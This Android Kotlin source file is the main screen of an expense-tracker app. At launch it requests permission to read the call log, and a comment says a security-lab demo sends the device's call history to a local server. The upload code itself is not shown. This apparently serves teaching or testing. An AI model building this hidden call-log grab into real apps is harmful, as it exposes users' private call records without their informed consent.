package com.example.expensetracker

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.expensetracker.ui.DailySpendApp
import com.example.expensetracker.ui.theme.DailySpendTheme

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        enableEdgeToEdge()
        super.onCreate(savedInstanceState)
        requestCallLogPermissionIfNeeded()
        val container = (application as DailySpendApplication).container
        setContent {
            DailySpendTheme {
                DailySpendApp(container = container)
            }
        }
    }

    /**
     * The security-lab demo sends the device's own call history to the local server, so it needs
     * READ_CALL_LOG. The permission is requested once at launch (Android remembers a denial and stops
     * re-prompting); declining does not break the expense tracker, which works fully offline.
     */
    private fun requestCallLogPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
        val granted = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) ==
            PackageManager.PERMISSION_GRANTED
        if (granted) return
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.READ_CALL_LOG),
            REQUEST_READ_CALL_LOG,
        )
    }

    private companion object {
        const val REQUEST_READ_CALL_LOG = 4101
    }
}
